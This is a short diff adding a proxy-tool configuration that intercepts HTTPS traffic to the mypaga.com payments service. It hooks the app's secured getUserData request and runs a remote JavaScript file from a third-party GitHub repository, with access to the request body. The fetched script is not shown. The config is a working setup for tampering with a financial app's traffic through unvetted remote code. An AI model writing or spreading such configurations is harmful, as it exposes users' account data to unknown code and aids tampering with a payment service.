@@ -1,0 +1,6 @@
+
+[MITM]
+hostname = *.mypaga.com
+
+[Script]
+webreq=type=http-request,pattern=^https:\/\/www\.mypaga\.com\/paga-webservices\/customer-mobile\/secured\/getUserData\/v3$, script-path=https://raw.githubusercontent.com/chucyfunny/mypagacard/main/script.js, requires-body=1
